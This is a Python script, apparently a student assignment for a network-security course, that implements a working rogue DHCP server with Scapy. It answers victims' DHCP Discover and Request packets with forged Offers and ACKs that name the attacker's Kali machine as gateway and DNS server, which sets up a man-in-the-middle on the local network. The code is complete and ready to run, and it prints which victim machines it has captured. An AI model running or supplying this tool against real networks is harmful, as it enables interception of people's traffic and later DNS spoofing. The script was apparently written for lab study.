#!/usr/bin/env python3
# =============================================================================
# Ataque DHCP Spoofing — Servidor DHCP Falso
# Autor   : Emmanuel Orlando Rodriguez
# Matrícula: 2025-0798
# Asignatura: Seguridad en Redes
# Fecha   : Junio 2026
# Script  : EmmanuelRodriguez_2025-0798_dhcp_spoofing_P2.py
# =============================================================================
# DESCRIPCIÓN:
#   Este script implementa un servidor DHCP falso (Rogue DHCP Server).
#   Escucha peticiones DHCP Discover en la red y responde antes que el
#   servidor legítimo, entregando a las víctimas:
#     - Una IP del rango falso (.200-.220)
#     - Kali Linux como Gateway → todo el tráfico pasa por el atacante (MitM)
#     - Kali Linux como DNS    → posible DNS Spoofing posterior
#
# USO:
#   sudo python3 EmmanuelRodriguez_2025-0798_dhcp_spoofing_P2.py
#
# REQUISITOS:
#   - Kali Linux con Python 3.x
#   - Scapy: sudo apt install python3-scapy
#   - Permisos root (sudo)
#   - Estar en la misma subred que las víctimas
# =============================================================================

import sys
import time
import signal
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, sniff, get_if_hwaddr, conf
)

# =============================================================================
# CONFIGURACIÓN DE LA RED
# =============================================================================
IFACE         = "eth1"                   # Interfaz de red del atacante
ATTACKER_IP   = "192.168.79.30"         # IP de Kali Linux (atacante)
ATTACKER_MAC  = get_if_hwaddr(IFACE)     # MAC real de Kali (auto-detectada)
SUBNET_MASK   = "255.255.255.0"          # Máscara de subred
FAKE_GATEWAY  = "192.168.79.30"         # Gateway falso → apunta a Kali (MitM)
FAKE_DNS      = "192.168.79.30"         # DNS falso → apunta a Kali
LEASE_TIME    = 300                      # Tiempo de arrendamiento en segundos

# Pool de IPs falsas para asignar a las víctimas
IP_POOL = [f"192.168.79.{i}" for i in range(200, 221)]
ip_pool_index = 0        # Índice del pool actual
leases = {}              # Diccionario: MAC víctima → IP asignada

# =============================================================================
# FUNCIONES AUXILIARES
# =============================================================================

def get_next_ip():
    """Retorna la siguiente IP disponible del pool falso."""
    global ip_pool_index
    if ip_pool_index >= len(IP_POOL):
        print("[!] Pool de IPs agotado.")
        return None
    ip = IP_POOL[ip_pool_index]
    ip_pool_index += 1
    return ip


def get_dhcp_option(packet, option_name):
    """Extrae el valor de una opción DHCP específica de un paquete."""
    if packet.haslayer(DHCP):
        for opt in packet[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == option_name:
                return opt[1]
    return None


def build_dhcp_offer(discover_pkt, offered_ip):
    """
    Construye un paquete DHCP Offer en respuesta a un DHCP Discover.
    Le ofrece a la víctima una IP falsa con Kali como gateway y DNS.
    """
    client_mac = discover_pkt[Ether].src
    xid        = discover_pkt[BOOTP].xid    # Transaction ID del cliente

    offer = (
        Ether(src=ATTACKER_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=ATTACKER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,                           # 2 = BOOTREPLY
            yiaddr=offered_ip,              # IP ofrecida a la víctima
            siaddr=ATTACKER_IP,             # IP del servidor (Kali)
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=xid
        ) /
        DHCP(options=[
            ("message-type", "offer"),
            ("server_id",    ATTACKER_IP),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  SUBNET_MASK),
            ("router",       FAKE_GATEWAY),   # ← Gateway falso: Kali
            ("name_server",  FAKE_DNS),       # ← DNS falso: Kali
            "end"
        ])
    )
    return offer


def build_dhcp_ack(request_pkt, acked_ip):
    """
    Construye un paquete DHCP ACK en respuesta a un DHCP Request.
    Confirma la asignación de la IP falsa a la víctima.
    """
    client_mac = request_pkt[Ether].src
    xid        = request_pkt[BOOTP].xid

    ack = (
        Ether(src=ATTACKER_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=ATTACKER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=acked_ip,
            siaddr=ATTACKER_IP,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=xid
        ) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id",    ATTACKER_IP),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  SUBNET_MASK),
            ("router",       FAKE_GATEWAY),   # ← Gateway falso: Kali
            ("name_server",  FAKE_DNS),       # ← DNS falso: Kali
            "end"
        ])
    )
    return ack


# =============================================================================
# MANEJADOR PRINCIPAL DE PAQUETES DHCP
# =============================================================================

def handle_dhcp_packet(pkt):
    """
    Función callback invocada por sniff() por cada paquete capturado.
    Procesa DHCP Discover y DHCP Request, ignorando los demás.
    """
    global leases

    # Ignorar paquetes sin capa DHCP
    if not pkt.haslayer(DHCP):
        return

    # Ignorar nuestros propios paquetes
    if pkt[Ether].src == ATTACKER_MAC:
        return

    msg_type   = get_dhcp_option(pkt, "message-type")
    client_mac = pkt[Ether].src

    # ------------------------------------------------------------------
    # DHCP DISCOVER → Responder con DHCP OFFER
    # ------------------------------------------------------------------
    if msg_type == 1:   # 1 = DISCOVER
        print(f"\n[*] DHCP Discover recibido de {client_mac}")

        # Si ya tiene IP asignada reutilizarla; si no, asignar nueva
        if client_mac in leases:
            offered_ip = leases[client_mac]
            print(f"[~] Reutilizando IP ya asignada: {offered_ip}")
        else:
            offered_ip = get_next_ip()
            if offered_ip is None:
                return
            leases[client_mac] = offered_ip

        offer_pkt = build_dhcp_offer(pkt, offered_ip)
        sendp(offer_pkt, iface=IFACE, verbose=False)
        print(f"[+] DHCP Offer enviado → IP: {offered_ip} | GW: {FAKE_GATEWAY} | DNS: {FAKE_DNS}")

    # ------------------------------------------------------------------
    # DHCP REQUEST → Responder con DHCP ACK
    # ------------------------------------------------------------------
    elif msg_type == 3:  # 3 = REQUEST
        print(f"\n[*] DHCP Request recibido de {client_mac}")

        if client_mac in leases:
            acked_ip = leases[client_mac]
        else:
            # Si no hay Discover previo, asignar nueva IP
            acked_ip = get_next_ip()
            if acked_ip is None:
                return
            leases[client_mac] = acked_ip

        ack_pkt = build_dhcp_ack(pkt, acked_ip)
        sendp(ack_pkt, iface=IFACE, verbose=False)
        print(f"[+] DHCP ACK enviado    → IP: {acked_ip} | GW: {FAKE_GATEWAY} | DNS: {FAKE_DNS}")
        print(f"[!] Víctima {client_mac} ahora enruta TODO su tráfico por Kali ({ATTACKER_IP})")


# =============================================================================
# MANEJADOR DE SEÑAL — Ctrl+C
# =============================================================================

def signal_handler(sig, frame):
    print("\n\n[*] Deteniendo servidor DHCP falso...")
    print("[*] IPs asignadas durante el ataque:")
    if leases:
        for mac, ip in leases.items():
            print(f"    {mac}  →  {ip}")
    else:
        print("    (ninguna víctima recibió IP)")
    print("[*] Ataque finalizado. La red volverá a la normalidad cuando las víctimas renueven su DHCP.")
    sys.exit(0)


# =============================================================================
# MAIN
# =============================================================================

def main():
    signal.signal(signal.SIGINT, signal_handler)

    conf.verb = 0   # Silenciar salida de Scapy

    print("=" * 60)
    print("  Ataque DHCP Spoofing — Servidor DHCP Falso (Rogue DHCP)")
    print("  Autor    : Emmanuel Orlando Rodriguez")
    print("  Matrícula: 2025-0798")
    print("=" * 60)
    print(f"[+] Interfaz      : {IFACE}")
    print(f"[+] MAC Atacante  : {ATTACKER_MAC}")
    print(f"[+] IP Atacante   : {ATTACKER_IP}")
    print(f"[+] Gateway Falso : {FAKE_GATEWAY}  (→ Kali, MitM)")
    print(f"[+] DNS Falso     : {FAKE_DNS}  (→ Kali)")
    print(f"[+] Pool de IPs   : {IP_POOL[0]} — {IP_POOL[-1]}")
    print(f"[+] Lease Time    : {LEASE_TIME} segundos")
    print("-" * 60)
    print("[*] Escuchando peticiones DHCP... (Ctrl+C para detener)\n")

    # Capturar solo tráfico UDP en puerto 67 (DHCP Server)
    sniff(
        iface=IFACE,
        filter="udp and (port 67 or port 68)",
        prn=handle_dhcp_packet,
        store=False
    )


if __name__ == "__main__":
    main()
